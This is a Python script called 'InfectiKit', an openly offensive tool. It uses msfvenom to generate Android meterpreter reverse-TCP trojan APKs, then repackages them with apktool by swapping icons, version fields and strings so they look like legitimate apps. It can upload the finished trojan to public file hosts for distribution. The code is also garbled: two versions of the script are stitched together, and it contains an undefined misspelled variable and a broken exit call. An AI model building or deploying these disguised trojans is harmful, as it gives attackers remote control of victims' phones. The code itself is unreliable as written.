#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# style and colors
r = '\033[38;5;196m'  
g = '\033[38;5;46m'  
b = '\033[38;5;32m'  
y = '\033[38;5;226m' 
c = '\033[38;5;51m'  
w = '\033[38;5;15m' 
d = '\033[38;5;243m' 
bl = '\033[38;5;24m'  
# global variable
hide = '> /dev/null 2>&1'
InfectiKit= f'{d}<{b}InfectiKit{d}>{w}'
user = f'{d}<{g}user{d}>{w}'
# import module
try:
    import os
    import re
    import sys
    import time
    import json
    import random
    import datetime
    import requests
    import fileinput
    from PIL import Image
except (ModuleNotFoundError):
    exit(f'''
{InfectiKit} : It seems there is a module that you have not installed
         run this command \'{g}pip install -r requirements.txt{w}\'
         to install it.
    ''')
# banner (InfectiKit v1.0)
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"{r}               (")
    print(f"{r}                )")
    print(f"{r}               (")
    print(f"{g}        /\  .-\"\"\"-.  /\\")
    print(f"{g}       //\\/  ,,,  \//\\")
    print(f"{g}       |/\\| ,;;;;;, |/\\|")
    print(f"{g}       //\\\\;-\"\"\"-;///\\\\")
    print(f"{g}      //  \\/   .   \\/  \\\\")
    print(f"{y}     (| ,-_| \\ | / |_-, |)")   
    print(f"{d}    Author: @manojxshrestha")  
    print(f"{y}       //`__\\.-.-./__`\\\\")  
    print(f"{y}      // /.-(() ())-.\ \\")
    print(f"{c}     (\\ |)   '---'   (| /)")
    print(f"{c}       ` (|           |) `")
    print(f"{c}         \\)           (/ ")
    print(f"{w}     'Use At Your Own Risk'")   
banner()
# print letter by letter
def prints(text):
    for line in text:
        print(line, end='', flush=True)
        time.sleep(0.008)
    print('')
# print truncate strings
def truncates(text, maxx=20):
    if len(text) > maxx: return text[:maxx - 3] + "..."
    else: return text
# search and replace specific string
def replace_string(oldstr, newstr, file):
    text = f'{InfectiKit} : add \'{d}{truncates(newstr)}{w}\' on \'{d}{os.path.basename(file)}{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    os.system(f'sed -i \'s#{oldstr}#{newstr}#g\' {file}')
    time.sleep(0.05)
    if not int(os.popen(f'grep -rc \'{newstr}\' {file}', 'r').readline().strip()) > 0: exit(text + f'{r}fail{w}')
    print(text + f'{g}done{w}')
    return newstr
# search and replace specific string 2
def replace_strings(oldstr, newstr, file):
    replaces = {oldstr:newstr}
    for line in fileinput.input(file, inplace=True):
        for search in replaces:
            replaced = replaces[search]
            line = line.replace(search,replaced)
        print(line, end="")
# add new icon path (for msfvenom apk)
def add_new_icon(icon, path):
    text = f'{InfectiKit} : add \'{d}ic_launcher.png{w}\' into \'{d}mipmap-hdpi-v4{w}\' ... '
    file = f'{path}/res/mipmap-hdpi-v4/ic_launcher.png'
    print(text + f'{y}wait{w}', end='\r')
    os.system(f'mkdir -p {path}/res/mipmap-hdpi-v4/')
    os.system(f'cp -r {icon} {file} {hide}')
    if not os.path.isfile(file): exit(text + f'{r}fail{w}')
    print(text + f'{g}done{w}')
    text = f'{InfectiKit} : add \'{d}ic_launcher.png{w}\' into \'{d}AndroidManifest.xml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    os.system(f'sed -i \'s#<application#<application android:icon="@mipmap/ic_launcher"#g\' {path}/AndroidManifest.xml')
    print(text + f'{g}done{w}')
    return file
# rename versionCode in apktool.yml
def rename_version_code(cstr, path):
    text = f'{InfectiKit} : add \'{d}{cstr}{w}\' into \'{d}{path}/apktool.yml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    code = os.popen(f'cat {path}/apktool.yml | grep "versionCode"', 'r').readline().strip()
    os.system(f'sed -i "s/{code}/versionCode: \'{cstr}\'/g" {path}/apktool.yml')
    time.sleep(0.05)
    print(text + f'{g}done{w}')
    return cstr
# rename versionName in apktool.yml
def rename_version_name(nstr, path):
    text = f'{InfectiKit} : add \'{d}{nstr}{w}\' into \'{d}{path}/apktool.yml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    name = os.popen(f'cat {path}/apktool.yml | grep "versionName"', 'r').readline().strip()
    os.system(f'sed -i "s/{name}/versionName: {nstr}/g" {path}/apktool.yml')
    time.sleep(0.05)
    print(text + f'{g}done{w}')
    return nstr
# rename directory 
def rename_dir(olddir, newdir):
    text = f'{InfectiKit} : rename \'{d}{olddir.split("/")[-1]}{w}\' into \'{d}{newdir.split("/")[-1]}{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    os.system(f'cp -rf {olddir} {newdir} {hide};rm -rf {olddir}')
    time.sleep(0.05)
    if not os.path.isdir(newdir): exit(text + f'{r}fail{w}')
    print(text + f'{g}done{w}')
    return newdir
# upload file to transfer.sh (primary url) or file.io (second url)
def upload_file(file):
    prints(f'''
{InfectiKit} : do you want to upload \'{g}{file}{w}\' ?
         
         (1) yes, i want to upload
         (2) no thanks
    ''')
    asks = str(input(f'{user} : '))
    if asks in ('2', '02'): return False
    text = f'{InfectiKit} : upload \'{d}{file}{w}\' into the link ...'
    print(text + f'{y}wait{w}', end='\r')
    link = os.popen(f'curl --upload-file {file} https://transfer.sh/{os.path.basename(file)} --silent', 'r').readline().strip()
    if 'https' not in link:
        try:
            link = re.search('"link":"(.*?)"', os.popen(f'curl -F "file=@{file}" https://file.io --silent','r').read()).group(1)
        except:
            print(text + f'{r}fail{w}')
            return False
    print(text + f'{g}done{w}')
    prints(f'''
{InfectiKit} : your file has been successfully uploaded,
         here is the download link ...
         
         {y}{link}{w}''')
# generate raw trojan using msfvenom (metasploit)
def generate_trojan(host, port, name = None):
    if name == None: name = 'trojan'
    text = f'{InfectiKit} : generate \'{d}{name}.apk{w}\' using msfvenom{w} ... '
    print(text + f'{y}wait{w}', end='\r')
    os.system(f'msfvenom -p android/meterpreter/reverse_tcp lhost={host} lport={port} -a dalvik --platform android -o {name}.apk {hide}')
    if not os.path.isfile(name + '.apk'): exit(text + f)
    if not os.path.isfile(name + '.apk'): exit(text + f'{r}fail{w}')
    print(text + f'{g}done{w}')
    return name + '.apk'
# example of how to use functions
def main():
    banner()
    print(f"InfectiKit : This tool helps you to customize and prepare APK files with various options.")
    
    print(f"{InfectiKit} : choose an action to proceed:")
    print(f"    (1) Generate a Trojan APK using msfvenom")
    print(f"    (2) Modify versionName in APK")
    print(f"    (3) Modify versionCode in APK")
    print(f"    (4) Replace strings in APK files")
    print(f"    (5) Upload file to transfer.sh or file.io")
    print(f"    (6) Exit")

    action = input(f"{user} : ")

    if action == "1":
        host = input(f"InfectiKit : Enter the local host IP (e.g. 192.168.1.1): ")
        port = input(f"InfectiKit : Enter the port (e.g. 4444): ")

        trojan = generate_trojan(host, port)
        print(f"InfectiKit : Trojan APK generated: {trojan}")

        
    elif action == "2":
        apk_path = input(f"{InfectiKit} : Enter the path to your APK: ")
        version_name = input(f"{InfectiKit} : Enter the new version name: ")
        rename_version_name(version_name, apk_path)
        
    elif action == "3":
        apk_path = input(f"{InfectiKit} : Enter the path to your APK: ")
        version_code = input(f"{InfectiKit} : Enter the new version code: ")
        rename_version_code(version_code, apk_path)
        
    elif action == "4":
        apk_path = input(f"{InfectiKit} : Enter the path to your APK: ")
        old_str = input(f"{InfectiKit} : Enter the string to search for: ")
        new_str = input(f"{InfectiKit} : Enter the string to replace with: ")
        replace_strings(old_str, new_str, apk_path)
        
    elif action == "5":
        file_to_upload = input(f"{InfectiKit} : Enter the file path to upload: ")
        upload_file(file_to_upload)
        
    elif action == "6":
        print(f"{InfectiKit} : exiting {g}InfectiKit{w}.")
        exit(0)
    else:
        print(f"{InfectiKit} : invalid choice. Please try again.")

if __name__ == "__main__":
    main()
# Function to upload files
def upload_file(file_path):
    print(f"{InfectiKIt} : preparing to upload {file_path}...")
    if not os.path.isfile(file_path):
        print(f"{r}Error: file not found!{w}")
        return
    
    # Upload to file.io
    response = requests.post("https://file.io", files={"file": open(file_path, "rb")})
    if response.status_code == 200:
        print(f"{InfectiKIt} : upload successful! Link: {response.json()['link']}")
    else:
        print(f"{r}Error: Upload failed.{w}")
        
# Function to replace strings in the APK
def replace_strings(old_str, new_str, apk_path):
    print(f"{InfectiKIt} : searching and replacing {old_str} with {new_str} in APK...")
    if not os.path.isfile(apk_path):
        print(f"{r}Error: APK file not found!{w}")
        return
    
    # APKTool decompile
    os.system(f"apktool d {apk_path} -o temp_apk")
    
    # Replace strings in the resources and manifest
    for root, dirs, files in os.walk('temp_apk'):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.endswith('.xml') or file_path.endswith('.smali'):
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                content = content.replace(old_str, new_str)
                
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(content)
    
    # Rebuild APK
    os.system(f"apktool b temp_apk -o modified.apk")
    print(f"{InfectiKIt} : APK modified successfully. Output: modified.apk")

# Function to rename versionName
def rename_version_name(version_name, apk_path):
    print(f"{InfectiKit} : renaming versionName to {version_name}...")
    if not os.path.isfile(apk_path):
        print(f"{r}Error: APK file not found!{w}")
        return
    
    # APKTool decompile
    os.system(f"apktool d {apk_path} -o temp_apk")
    
    # Modify versionName in AndroidManifest.xml
    manifest_path = "temp_apk/AndroidManifest.xml"
    with open(manifest_path, 'r', encoding='utf-8') as f:
        content = f.read()

    content = content.replace('android:versionName="1.0"', f'android:versionName="{version_name}"')

    with open(manifest_path, 'w', encoding='utf-8') as f:
        f.write(content)
    
    # Rebuild APK
    os.system(f"apktool b temp_apk -o modified.apk")
    print(f"{InfectiKit} : versionName updated. Output: modified.apk")

# Function to rename versionCode
def rename_version_code(version_code, apk_path):
    print(f"{InfectiKit} : renaming versionCode to {version_code}...")
    if not os.path.isfile(apk_path):
        print(f"{r}Error: APK file not found!{w}")
        return
    
    # APKTool decompile
    os.system(f"apktool d {apk_path} -o temp_apk")
    
    # Modify versionCode in AndroidManifest.xml
    manifest_path = "temp_apk/AndroidManifest.xml"
    with open(manifest_path, 'r', encoding='utf-8') as f:
        content = f.read()

    content = content.replace('android:versionCode="1"', f'android:versionCode="{version_code}"')

    with open(manifest_path, 'w', encoding='utf-8') as f:
        f.write(content)
    
    # Rebuild APK
    os.system(f"apktool b temp_apk -o modified.apk")
    print(f"{InfectiKIt} : versionCode updated. Output: modified.apk")

# Function to generate a Trojan APK using msfvenom
def generate_trojan(host, port):
    print(f"{InfectiKit} : generating Trojan APK with msfvenom...")
    trojan_name = f"trojan_{host}_{port}.apk"
    command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o {trojan_name}"
    os.system(command)
    if os.path.isfile(trojan_name):
        print(f"{InfectiKit} : Trojan APK generated: {trojan_name}")
        return trojan_name
    else:
        print(f"{r}Error: Trojan generation failed!{w}")
        return None

# Utility function to handle banner printing
def banner():
    print(f"""
{g}==========================================
    {w}InfectiKit - APK Modification Tool{g}
    {w}by @manojxshrestha{g}
==========================================
""")
    
# Main function that drives the tool
def main():
    banner()
    print(f"{InfectiKit} : This tool helps you to customize and prepare APK files with various options.")
    
    while True:
        print(f"{InfectiKit} : choose an action to proceed:")
        print(f"    (1) Generate a Trojan APK using msfvenom")
        print(f"    (2) Modify versionName in APK")
        print(f"    (3) Modify versionCode in APK")
        print(f"    (4) Replace strings in APK files")
        print(f"    (5) Upload file to transfer.sh or file.io")
        print(f"    (6) Exit")

        action = input(f"{user} : ")

        if action == "1":
            host = input(f"{InfectiKIt} : Enter the local host IP (e.g. 192.168.1.1): ")
            port = input(f"{InfectiKIt} : Enter the port (e.g. 4444): ")
            trojan = generate_trojan(host, port)
            print(f"{InfectiKIt} : Trojan APK generated: {trojan}")
            
        elif action == "2":
            apk_path = input(f"{InfectiKIt} : Enter the path to your APK: ")
            version_name = input(f"{InfectiKIt} : Enter the new version name: ")
            rename_version_name(version_name, apk_path)
            
        elif action == "3":
            apk_path = input(f"{InfectiKit} : Enter the path to your APK: ")
            version_code = input(f"{InfectiKit} : Enter the new version code: ")
            rename_version_code(version_code, apk_path)
            
        elif action == "4":
            apk_path = input(f"{InfectiKit} : Enter the path to your APK: ")
            old_str = input(f"{InfectiKit} : Enter the string to search for: ")
            new_str = input(f"{InfectiKit} : Enter the string to replace with: ")
            replace_strings(old_str, new_str, apk_path)
            
        elif action == "5":
            file_to_upload = input(f"{InfectiKit} : Enter the file path to upload: ")
            upload_file(file_to_upload)
            
        elif action == "6":
            print(f"{InfectiKit} : exiting {g}InfectiKit{w}.")
            exit(0)
        else:
            print(f"{InfectiKit} : invalid choice. Please try again.")

if __name__ == "__main__":
    main()
